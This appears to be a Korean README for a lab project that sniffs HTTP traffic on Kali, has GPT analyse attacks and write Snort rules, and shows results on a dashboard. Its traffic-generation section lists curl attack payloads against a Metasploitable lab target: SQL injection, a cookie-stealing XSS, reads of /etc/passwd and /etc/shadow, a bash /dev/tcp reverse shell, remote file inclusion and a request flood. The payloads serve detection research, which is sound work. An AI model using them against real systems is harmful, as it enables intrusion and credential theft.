# 🛡️ LLM 기반 HTTP 패킷 분석 & Snort 룰 생성기

> Kali Linux에서 실시간으로 HTTP 패킷을 수집하고,
> OpenAI GPT를 활용해 공격을 분석하며 Snort 룰을 자동 생성하는 시스템

---

## 📁 프로젝트 구조

```
project-root/
│
├── .env.example                  ← 환경변수 템플릿 (복사 후 사용)
├── .gitignore
├── requirements.txt
├── community.rules               ← ⚠️ 직접 다운로드 필요
│
├── run_kali.py                   ← [Kali] 패킷 수집 에이전트 실행
├── run_windows.py                ← [Windows] 서버 + 대시보드 실행
│
├── _01_kali_agent/               ← [Kali] 패킷 스니핑 및 소켓 전송
│   ├── __init__.py
│   ├── sniffer.py                # scapy 기반 HTTP 패킷 수집
│   ├── packet_processor.py       # HTTP 파싱 및 JSON 변환
│   └── sender.py                 # Windows 서버로 소켓 전송
│
├── _02_window_backend/           ← [Windows] 소켓 수신 + 전처리
│   ├── __init__.py
│   ├── socket_server.py          # TCP 소켓 서버
│   └── controller.py             # URL 디코딩·전처리, 분석 콜백 주입
│
├── _03_ai_analyzer/              ← [Windows] 시그니처 매칭 + LLM 분석
│   ├── __init__.py
│   ├── rule_parser.py            # community.rules 파싱
│   ├── signature_checker.py      # 로컬 룰 1차 매칭
│   ├── openai_client.py          # API 키 보안 로드 + Rate Limit
│   ├── prompt_templates.py       # GPT 프롬프트 템플릿
│   └── analyzer.py               # 로컬→LLM 분기 통합
│
├── _04_gradio_visual/            ← [Windows] 실시간 대시보드
│   ├── __init__.py
│   ├── store.py                  # 결과 큐 소비 및 데이터 관리
│   └── dashboard.py              # Gradio 3분할 UI (3초 자동 갱신)
│
├── test_local_rules.py           ← 단위 테스트 (API 키·서버 불필요)
├── test_analyzer.py              ← 분석기 테스트 (API 키 필요)
└── test_socket_client.py         ← 통합 테스트 (서버 실행 후)
```

---

## 🖥️ 실행 환경 및 네트워크 구성

| 역할 | OS | IP 주소 | Netmask | Gateway | DNS |
|---|---|---|---|---|---|
| 공격자 / 패킷 수집 | Kali Linux (VMware) | 192.168.10.10 | 255.255.255.0 (/24) | 192.168.10.2 | 192.168.10.2 |
| 공격 대상 | Metasploitable 2 (VMware) | 192.168.10.20 | 255.255.255.0 | 192.168.10.2 | — |
| 분석 서버 / 대시보드 | Windows 10 | 192.168.10.30 | 255.255.255.0 | 192.168.10.2 | 192.168.10.2 |

> 세 머신 모두 **VMware VMnet8 (NAT)** 네트워크 `192.168.10.0/24` 에 연결되어야 합니다.

---

## ⚙️ 사전 준비 (공통)

### community.rules 다운로드
```
https://www.snort.org/downloads#rules
→ Snort Community Ruleset 다운로드
→ 압축 해제 후 community.rules 파일을 프로젝트 루트에 복사
```

### OpenAI API 키 발급
```
https://platform.openai.com/api-keys → API 키 발급
```

---

## 🚀 실행 순서

### 1️⃣ Metasploitable — Apache 웹서버 시작

```bash
sudo /etc/init.d/apache2 start
```

> Kali에서 공격 트래픽을 보낼 대상 HTTP 서버입니다.

---

### 2️⃣ Windows — 서버 및 대시보드 실행

**① Git 설치**
```
https://git-scm.com 에서 다운로드 및 설치
```

**② Python 설치**
```
https://python.org/downloads/windows 에서 다운로드
설치 시 ✅ "Add Python to PATH" 반드시 체크
```

**③ 프로젝트 세팅**
```powershell
git clone [저장소 URL]
cd [프로젝트 폴더]

python -m venv venv

# PowerShell 실행 정책 변경 (PowerShell 최초 1회)
Set-ExecutionPolicy RemoteSigned

.\venv\Scripts\activate
pip install -r requirements.txt

copy env.example .env
# .env 파일 열어서 OPENAI_API_KEY=sk-... 입력
# community.rules 파일을 프로젝트 루트에 복사
```

**④ 서버 실행**
```powershell
python run_windows.py
# 또는 서버시작.bat 더블클릭
```

> ✅ http://localhost:7860 에서 대시보드 확인

---

### 3️⃣ Kali — 패킷 수집 에이전트 실행

**① 프로젝트 세팅**
```bash
git clone [저장소 URL]
cd [프로젝트 폴더]

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

cp env.example .env
nano .env
```

**② .env 설정**
```env
SERVER_IP=192.168.10.30    # Windows IP
SERVER_PORT=9999
INTERFACE=eth0             # ip a 명령으로 확인한 인터페이스 이름
BPF_FILTER=tcp port 80
DEBUG=1
```

**③ community.rules 파일을 프로젝트 루트에 복사**

**④ 에이전트 실행**
```bash
sudo venv/bin/python3 run_kali.py
```

> ⚠️ scapy는 root 권한 필요 → 반드시 `sudo`로 실행
> ⚠️ venv 사용 시 `sudo python3` 대신 `sudo venv/bin/python3` 사용

---

### 4️⃣ 공격 트래픽 발생

Kali에서 새 터미널을 열고 Metasploitable(`192.168.10.20`)을 대상으로 공격 트래픽을 전송합니다.

```bash
TARGET=192.168.10.20

# ── 정상 요청 ───────────────────────────────────────────────
curl http://$TARGET/

# ── SQL Injection ───────────────────────────────────────────
# 기본 OR 조건 우회
curl "http://$TARGET/mutillidae/index.php?page=user-info.php&username=admin'+OR+'1'='1&password=&user-info-php-submit-button=View+Account+Details"

# UNION 기반 컬럼 추출
curl "http://$TARGET/mutillidae/index.php?page=user-info.php&username=1'+UNION+SELECT+null,null,null,table_name,null+FROM+information_schema.tables--+-"

# Blind SQL Injection (시간 기반)
curl "http://$TARGET/mutillidae/index.php?page=user-info.php&username=1'+AND+SLEEP(5)--+-"

# ── XSS (Cross-Site Scripting) ──────────────────────────────
# Reflected XSS
curl "http://$TARGET/mutillidae/index.php?page=dns-lookup.php&target_host=<script>alert(document.cookie)</script>"

# Stored XSS (POST)
curl -X POST "http://$TARGET/mutillidae/index.php?page=add-to-your-blog.php" \
  --data "blog_entry=<script>document.location='http://192.168.10.10/steal?c='+document.cookie</script>&add-to-your-blog-php-submit-button=Save+Blog+Entry"

# ── Path Traversal ──────────────────────────────────────────
# /etc/passwd 읽기
curl "http://$TARGET/mutillidae/index.php?page=../../../../etc/passwd"

# /etc/shadow 읽기 시도
curl "http://$TARGET/mutillidae/index.php?page=../../../../etc/shadow"

# ── Command Injection ───────────────────────────────────────
# ping 명령에 명령 삽입
curl "http://$TARGET/mutillidae/index.php?page=dns-lookup.php&target_host=127.0.0.1;cat+/etc/passwd"

# 리버스 쉘 시도
curl "http://$TARGET/mutillidae/index.php?page=dns-lookup.php&target_host=127.0.0.1;bash+-i+>&+/dev/tcp/192.168.10.10/4444+0>&1"

# ── File Inclusion ──────────────────────────────────────────
# Local File Inclusion
curl "http://$TARGET/mutillidae/index.php?page=/etc/passwd%00"

# Remote File Inclusion
curl "http://$TARGET/mutillidae/index.php?page=http://192.168.10.10/malicious.php"

# ── LDAP Injection ──────────────────────────────────────────
curl "http://$TARGET/mutillidae/index.php?page=user-info.php&username=admin)(%26(objectClass=*"

# ── HTTP Response Splitting ─────────────────────────────────
curl "http://$TARGET/index.php?redirect=http://evil.com%0d%0aSet-Cookie:+session=hijacked"

# ── 대량 요청 (DoS 시뮬레이션) ─────────────────────────────
for i in {1..20}; do
  curl -s "http://$TARGET/?id=$i'+OR+'1'='1" > /dev/null
  echo "[$i/20] 전송됨"
done
```

> Windows 대시보드(http://localhost:7860)에서 실시간 분석 결과를 확인합니다.

---

## 📊 대시보드 구성

| 탭 | 내용 |
|---|---|
| 📦 패킷 로그 | 수신된 모든 HTTP 패킷 목록 (최신순) |
| 🧠 AI 분석 리포트 | 공격으로 판정된 패킷의 상세 분석 결과 |
| 🛡️ Snort 룰 | LLM이 새로 생성한 Snort 룰 목록 (복사 기능 포함) |

---
![uml_kali_backend](https://github.com/user-attachments/assets/2421f367-cc70-4c7d-9c78-4622068a2e43)
![uml_analyzer_dashboard](https://github.com/user-attachments/assets/51962445-e58f-4c7e-b0c1-cb4d507ca10d)
---
![sequence_diagram](https://github.com/user-attachments/assets/84991694-5925-474d-b120-9ab7f97625d8)
---

## 🔒 보안 주의사항

- `.env` 파일을 절대 git에 커밋하지 마세요 (`.gitignore` 등록됨)
- `community.rules`도 git 제외 (용량 및 라이선스 문제)
- API 키 유출 시 즉시 폐기: https://platform.openai.com/api-keys

---

## 🧪 Kali 없이 테스트

Windows 서버만 실행된 상태에서 모의 패킷을 전송할 수 있습니다.

```powershell
# 터미널 1
python run_windows.py

# 터미널 2
python test_socket_client.py
```
